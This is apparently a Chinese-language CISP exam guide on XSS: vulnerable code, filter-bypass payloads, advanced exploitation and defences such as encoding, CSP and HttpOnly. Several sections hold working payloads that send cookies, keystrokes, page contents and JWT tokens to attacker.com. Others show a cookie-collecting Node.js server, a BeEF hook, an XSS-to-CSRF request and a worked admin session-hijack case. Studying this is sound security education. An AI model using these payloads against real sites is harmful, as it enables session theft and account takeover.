# XSS 跨站脚本攻击与修复方案

> **📘 文档定位**：CISP 考试 渗透测试 核心 | 难度：⭐⭐⭐ | 预计阅读：28 分钟
>
> 系统讲解 XSS 跨站脚本攻击的三类形态（反射型/存储型/DOM型）、利用技巧（Cookie窃取/钓鱼/键盘记录）及修复方案（CSP/HttpOnly/输入输出编码）。

---

## 导航目录

- [一、XSS 攻击分类](#一xss-攻击分类)
- [二、反射型 XSS 利用](#二反射型-xss-利用)
- [三、存储型 XSS 利用](#三存储型-xss-利用)
- [四、DOM 型 XSS 利用](#四dom-型-xss-利用)
- [五、XSS 防御方案](#五xss-防御方案)
- [六、安全部署 Checklist](#六安全部署-checklist)
- [七、高分考点与知识巧记](#七高分考点与知识巧记)

---

## 📋 目录

1. [XSS 基础与分类](#一xss-基础)
2. [反射型 XSS](#二反射型-xss)
3. [存储型 XSS](#三存储型-xss)
4. [DOM 型 XSS](#四dom-型-xss)
5. [XSS 绕过技巧大全](#五xss-绕过技巧)
6. [XSS 高阶利用](#六xss-高阶利用)
7. [自动化检测工具](#七自动化检测)
8. [完整案例：某论坛存储型XSS](#八完整案例)
9. [防御方案](#九防御方案)
10. [排错指南](#十排错指南)

---

## 一、XSS 基础

```
XSS (Cross-Site Scripting) = 跨站脚本攻击

原理：攻击者向网页注入恶意 JavaScript
      → 其他用户访问该页面时执行恶意代码

三大分类：
  反射型 XSS: 恶意脚本在URL参数中，服务端"反射"回页面
  存储型 XSS: 恶意脚本存储在数据库，所有访问者触发
  DOM 型 XSS:  恶意脚本在客户端执行，不经过服务端

危害等级：
  反射型 → Medium (需要点击链接)
  存储型 → High/Critical (所有访问者受影响)
  DOM型 → 取决于影响范围
```

---

## 二、反射型 XSS

### 2.1 漏洞代码与利用

```php
// ❌ 危险：直接输出用户输入
echo "搜索: " . $_GET['keyword'];

// 访问: /search.php?keyword=<script>alert(1)</script>
// → 弹出 alert(1)
```

### 2.2 完整探测流程

```bash
# ===== Step 1: 寻找注入点 =====
# 测试每个参数：
# ?q=test → 页面中出现 "test" → 候选点
# ?name=test → 页面中出现 "Hello test" → 候选点
# ?id=1 → 页面中出现 "Product 1" → 候选点

# ===== Step 2: 注入测试Payload =====
# 基础测试（是否过滤特殊字符）：
"<h1>test</h1>     # 看是否渲染为HTML
"<script>alert(1)</script>
"'><script>alert(1)</script>
';alert(1)//

# ===== Step 3: 确认XSS类型 =====
# 反射型: Payload在URL中，每次请求触发
# 存储型: Payload存入数据库，所有访问者触发
# DOM型: Payload不经过服务端，JavaScript处理触发

# ===== Step 4: 构造最终Payload =====
# 窃取Cookie:
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
# → 攻击者服务器收到受害者的Cookie

# 窃取页面内容:
<script>fetch('http://attacker.com/steal?d='+btoa(document.body.innerHTML))</script>

# 键盘记录:
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/keys?k=' + e.key);
};
</script>
```

---

## 三、存储型 XSS

### 3.1 漏洞代码

```php
// ❌ 论坛发帖功能
$content = $_POST['content'];  // 用户输入 "nice post!<script>...</script>"
$sql = "INSERT INTO posts (content) VALUES ('$content')";
mysqli_query($conn, $sql);

// 显示帖子
$result = mysqli_query($conn, "SELECT content FROM posts");
while ($row = mysqli_fetch_assoc($result)) {
    echo $row['content'];  // ⚠️ 直接输出！XSS触发！
}
```

### 3.2 XSS 平台搭建

```javascript
// 自建XSS接收平台 (Node.js)
// server.js
const express = require('express');
const app = express();

// 接收Cookies
app.get('/steal', (req, res) => {
    const cookie = req.query.c;
    const ip = req.ip;
    console.log(`[+] Cookie from ${ip}: ${cookie}`);
    fs.appendFileSync('stolen.txt', `${new Date().toISOString()} | ${ip} | ${cookie}\n`);
    res.send(''); // 不返回任何内容（隐蔽）
});

// 接收页面截图（用HTML2Canvas）
app.post('/screenshot', express.json({limit: '10mb'}), (req, res) => {
    const img = req.body.img;
    require('fs').writeFileSync(`screenshots/${Date.now()}.png`, img, 'base64');
    res.send('');
});

app.listen(80);
```

### 3.3 Beef 框架

```bash
# Beef (Browser Exploitation Framework)
# 下载: https://github.com/beefproject/beef
cd beef
./install
./beef

# 默认: http://127.0.0.1:3000/ui/panel (beef:beef)

# Hook 代码：
<script src="http://attacker.com:3000/hook.js"></script>
# → 受害者浏览器被Hook → Beef控制台可执行300+模块：
#   - 窃取Cookie
#   - 键盘记录
#   - 截图
#   - 浏览器指纹
#   - 浏览器漏洞利用
#   - 社会工程弹窗(伪造登录框)
#   - 局域网端口扫描(通过WebSocket)
```

---

## 四、DOM 型 XSS

### 4.1 漏洞代码

```javascript
// ❌ 危险：innerHTML 输出用户输入
var hash = location.hash.substring(1);
document.getElementById('content').innerHTML = hash;
// 访问: /page.html#<img src=x onerror=alert(1)>

// ❌ 危险：eval 执行用户输入
eval(location.hash.substring(1));

// ❌ 危险：document.write
document.write('Hello ' + location.search.split('=')[1]);

// ❌ 危险：jQuery html()
$('#content').html(location.hash.substring(1));
```

### 4.2 DOM XSS Sources & Sinks

```
Sources（用户输入源）:
  location / location.hash / location.search
  document.URL / document.documentURI
  window.name
  document.referrer
  postMessage event.data

Sinks（危险输出点）:
  innerHTML / outerHTML
  document.write / document.writeln
  eval / setTimeout / setInterval
  javascript: URL
  jQuery html() / append()
  window.open()
```

---

## 五、XSS 绕过技巧大全

### 5.1 标签绕过（<script> 被过滤）

```html
<!-- 1. img 标签 -->
<img src=x onerror=alert(1)>
<img src=x onerror="alert(1)">

<!-- 2. svg 标签 -->
<svg onload=alert(1)>
<svg/onload=alert(1)>

<!-- 3. body 标签 -->
<body onload=alert(1)>

<!-- 4. input 标签 -->
<input onfocus=alert(1) autofocus>

<!-- 5. details 标签（无需用户交互）-->
<details open ontoggle=alert(1)>

<!-- 6. video 标签 -->
<video><source onerror=alert(1)>

<!-- 7. marquee 标签（IE/旧Edge）-->
<marquee onstart=alert(1)>

<!-- 8. 自定义标签 -->
<xss onmouseover=alert(1)>hover me</xss>
```

### 5.2 关键字绕过

```javascript
// alert 被过滤
<svg onload=confirm(1)>
<svg onload=prompt(1)>
<svg onload=top.alert(1)>
<svg onload=window['alert'](1)>
<svg onload=self[atob('YWxlcnQ=')](1)>

// 括号被过滤
<svg onload=alert`1`>
<svg onload=setTimeout`alert\`1\``>

// 冒号被过滤
<svg onload=alert(1)>
// 用 javascript: 伪协议：
<a href="javascript:alert(1)">x</a>

// . 被过滤
// 属性值可拼接：
<img src=x onerror="a=alert;a(1)">
```

### 5.3 编码绕过

```html
<!-- HTML实体编码 -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">

<!-- URL编码 -->
<a href="javascript:%61%6c%65%72%74(1)">x</a>

<!-- Unicode编码 -->
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">

<!-- Base64 (需eval配合) -->
<svg onload="eval(atob('YWxlcnQoMSk='))">

<!-- 大小写混淆 -->
<IMg SrC=x OnErRoR=alert(1)>
<SCRIPT>alert(1)</SCRIPT>

<!-- 制表符/换行分隔 -->
<svg
onload
=alert(1)
>
```

### 5.4 长度限制绕过

```html
<!-- 超短Payload (15字符内) -->
<svg onload=eval(name)>  <!-- 配合 window.name 注入长代码 -->

<!-- 远程加载 -->
<script src="http://evil.com/e.js"></script>  <!-- 21字符 -->

<!-- 利用已有代码 -->
<script>eval(top.name)</script>  <!-- 从 window.name 读取代码 -->
```

---

## 六、XSS 高阶利用

### 6.1 窃取 JWT Token

```javascript
// 窃取 localStorage 中的 Token
<script>
fetch('http://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
        token: localStorage.getItem('auth_token'),
        user: document.querySelector('.username').innerText
    })
});
</script>
```

### 6.2 XSS → CSRF

```javascript
// 通过 XSS 触发敏感操作
<script>
// 修改管理员邮箱
fetch('/admin/settings', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email: 'attacker@evil.com'}),
    credentials: 'include'
});
</script>
```

### 6.3 内网穿透

```javascript
// 通过 XSS 扫描受害者内网
var img = new Image();
for (var i = 1; i < 255; i++) {
    img.src = 'http://192.168.1.' + i + ':8080/favicon.ico';
    img.onload = function() {
        fetch('http://attacker.com/log?ip=' + this.src);
    };
    img.onerror = function() {};
}
```

---

## 七、自动化检测

```bash
# XSStrike — 智能XSS检测+绕过
git clone https://github.com/s0md3v/XSStrike
cd XSStrike
python xsstrike.py -u "https://xxx.com/search?q=test"

# dalfox — 快速XSS扫描
dalfox url https://xxx.com/search?q=test
dalfox file targets.txt

# 浏览器插件：
# HackBar (Firefox/Chrome) — 快速编码/解码
```

### Burp Suite XSS 检测

```
Burp Suite 主动扫描 — XSS检测器
Dashboard → New Scan → 勾选 "Cross-site scripting"

手动技巧：
  Intruder → Payload Positions → 注入点标记
  Payloads → 导入 XSS 字典
  Grep - Match → 添加 "<script>alert"
  → 发起攻击 → 查看哪些返回含注入Payload
```

---

## 八、完整案例：论坛存储型 XSS

```
目标: 某技术论坛 community.xxx.com

Step 1: 基础探测
  注册账号→发帖: <h1>test</h1>
  → 标题渲染为<h1>test</h1> → 存在HTML注入

Step 2: XSS测试
  发帖: <img src=x onerror=alert(1)>
  → 刷新页面 → 弹窗! → 确认存储型XSS!
  → 所有访问该帖子的用户都会触发

Step 3: Cookie窃取
  搭建接收服务器(attacker.com)
  发帖正文:
    <img src=x onerror="
      var i=new Image();
      i.src='http://attacker.com/steal?c='+document.cookie
    ">
  → 5分钟后服务器收到第一条Cookie:
  PHPSESSID=abc123def456; user_id=123; role=user

Step 4: 提升影响
  → 私信管理员诱导点击该帖
  → 管理员Cookie:
  PHPSESSID=admin_session_xxx; user_id=1; role=admin
  → 用管理员Cookie登录 → 获得后台管理权限

漏洞等级: Critical (CVSS 9.0)
影响: 可窃取所有访问该帖子的用户Cookie
修复: 输出前HTML实体编码 → htmlspecialchars()
```

---

## 九、防御方案

```php
// ✅ 输出编码（最重要）
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// ✅ 内容安全策略 (CSP)
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
// 禁止内联脚本和执行外部脚本

// ✅ HttpOnly Cookie
setcookie('session', $value, [
    'httponly' => true,  // JavaScript无法读取
    'secure' => true,     // 仅HTTPS传输
    'samesite' => 'Strict'
]);

// ✅ 输入验证（白名单）
if (!preg_match('/^[a-zA-Z0-9 ]+$/', $input)) {
    die('非法输入');
}

// ✅ 模板引擎自动转义
// Twig: {{ user_input }} → 自动HTML转义
// Jinja2: {{ user_input|e }}
// React JSX: 默认转义，危险: dangerouslySetInnerHTML

// ✅ DOMPurify (客户端HTML消毒)
<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.0/purify.min.js"></script>
var clean = DOMPurify.sanitize(dirty);  // 只保留安全的HTML标签
```

---

## ✅ Checklist

**检测**
- [ ] 测试所有用户输入点（GET/POST/Cookie/Header）
- [ ] 测试 `<script>`、`<img>`、`<svg>` 等标签
- [ ] 测试编码绕过（HTML实体/URL/Unicode）
- [ ] 测试 WAF 绕过

**防御**
- [ ] 输出时 HTML 实体编码
- [ ] 设置 CSP 头
- [ ] Cookie 设置 HttpOnly + Secure
- [ ] 输入白名单验证
- [ ] 使用模板引擎自动转义（不用 innerHTML）
